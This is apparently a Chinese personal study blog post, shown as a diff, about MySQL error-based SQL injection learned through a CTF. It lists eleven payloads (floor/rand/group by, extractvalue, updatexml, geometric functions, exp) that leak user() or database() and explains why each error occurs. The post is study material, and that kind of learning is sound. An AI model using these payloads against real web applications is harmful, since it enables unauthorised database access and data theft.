@@ -1,0 +1,108 @@
+
+——志向和热爱是伟大行为的双翼。
+
+昨天偷懒了没学什么东西，先自我反省一下 - -。
+
+今天认真的学习了一下Mysql报错注入利用方法及原理，好久之前就像认真的学一下这个了，是在上海市大学生网络安全大赛中遇到的web100。当时懵逼状态，被学长提醒了一下才知道是Mysql报错注入，因为之前一直都没接触过，所以当时只是知道怎么用然后拿了flag。其实根本不知道什么原理怎么回事，直到今天才把一些常见的报错注入方法原理搞懂，所以写篇博客来加深记忆以便后期会议。
+
+首先，SQL有一下几种：
+
+1.UNION query SQL injection（可联合查询注入）
+
+2.Boolean-based blind SQL injection（布尔型注入）
+
+3.Error-based SQL injection（报错型注入）
+
+4.Stacked queries SQL injection（可多语句查询注入）
+
+5.Time-based blind SQL injection（基于时间延迟注入）
+
+今天我们说的就是Mysql的报错注入（想了解其他的请移步这里），共有11中方法（最后一种不适用于老版本）。
+
+1，floor() payload:
+
+and select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2))--
+
+2, extractvalue() payload:
+
+and extractvalue(1,concat(0x7e,user(),0x7e))--
+
+3, updatexml() payload:
+
+and updatexml(1,concat(0x7e,(select user()),0x7e),1)--
+
+4, geometrycollection() payload:
+
+and geometrycollection((select * from(select * from(select user())a)b))--
+
+5, multipoint() payload:
+
+and multipoint((select * from(select * from(select user())a)b))--
+
+6, polygon() payload:
+
+and polygon((select * from(select * from(select user())a)b))--
+
+7, multipolygon() payload:
+
+and multipolygon((select * from(select * from(select user())a)b))--
+
+8, linestring() payload:
+
+and linestring((select * from(select * from(select user())a)b))--
+
+9, multilinestring() payload:
+
+and multilinestring((select * from(select * from(select user())a)b))--
+
+10, exp() payload:
+
+and exp(~(select * from(select user())a))--
+
+11,基于Mysql的数据类型溢出（不适用于老版本的Mysql,5.5以后版本）
+
+
+Mysql报错注入原理分析（count()、rand()、group by）：
+
+基本上一下午都耗在这里了，因为实在不是很容易懂，其实也不是，只是开始的时候浪费了很长时间在一些讲的不透彻的资料上，接下来我就说一下我自己的理解。
+
+我们先来了解一下这三个函数的作用：
+
+count()：统计有select语句返回的记录。
+
+rand():随机生成0-1之间的浮点数  rand()*2就是0-2之间的浮点数
+
+group by:用于结合合计函数，根据一个或多个列对结果集进行分组。不懂的话具体例子看这里：GROUP BY
+
+另外  floor()函数是取整的意思。
+
+我们使数据库报错的payload有两种  1. and select concat(*) from information_schema.tables group by concat(database(),floor(rand(0)*2))--
+
+2. and select concat(*) from information_schema.tables group by concat(database(),floor(rand()*2))--
+
+这两个语法的区别在于 rand()函数有没有随机因子0，有随机因子的payload必定报错（因为有随机因子的语句生成的值固定——有规律），而没有随机因子的payload随机报错（随机生成值，无规律）。
+
+
+原理：
+
+当MySQL数据库执行该语句的时候会建立一个虚拟表，表中有主键key和count(*)。当从数据库提取数据时，执行一次payload，提取的值为0，接下来会访问虚拟表检查是否存在0，因为我们这是第一次执行，所以表中不存在数据，所以我们将数据插进虚拟表中，这时又执行了一次payload，这次的值为1，所以向虚拟表中插入key:1,count(*):1。接下来第二次提取数据，执行payload获得数据1,再次查询虚拟表，存在1，所以直接count(*)+1，这时我们已经执行了三次payload，继续第三次提取数据，执行语句，得到数据0，查询虚拟表中不存在0，所以向虚拟表中插入数据，执行payload得到1，插入表中，而虚拟表中此刻为： key:1,count(*):2。由于1已经存在，继续向数据表中插入1导致报错。其实简单来说，导致报错的原因就是数据库中主键的不可重复性。
+
+这就是为什么有随机因子的payload在数据库表大于3的情况下一定会报错，而另一个随机报错。我建议自己安装一个MySQL，然后在命令行下试一试这几个函数的效果，非常有助于理解。不是很好理解，如果本片文章不能让你看懂的话，可以移步这里，我也是在这篇博客的教导下自己在虚拟机中实践学懂的，没那么难理解。
+
+
+XML查询函数报错原理（extractvalue,updatexml）：
+
+这两个函数报错的原理其实都是一样的，因为函数的第二个参数要求为Xpath 的string格式，而我们用concat函数生成的是连接的字符串，因此报错。
+
+UPDATEXML (XML_document, XPath_string, new_value); 
+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 
+第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 
+第三个参数：new_value，String格式，替换查找到的符合条件的数据 
+作用：改变文档中符合条件的节点的值
+
+extractvalue函数同理。
+
+本文主要说了前三种报错注入的方法和原理，其余的因为我暂时还没遇到 感觉并不常用所以以后遇到的时候在补回来，如果对其他的报错注入有兴趣可以点这里。
+
+最后希望自己在这条路上继续坚持下去，保持热情，路途遥远且行且珍惜，共勉。
+
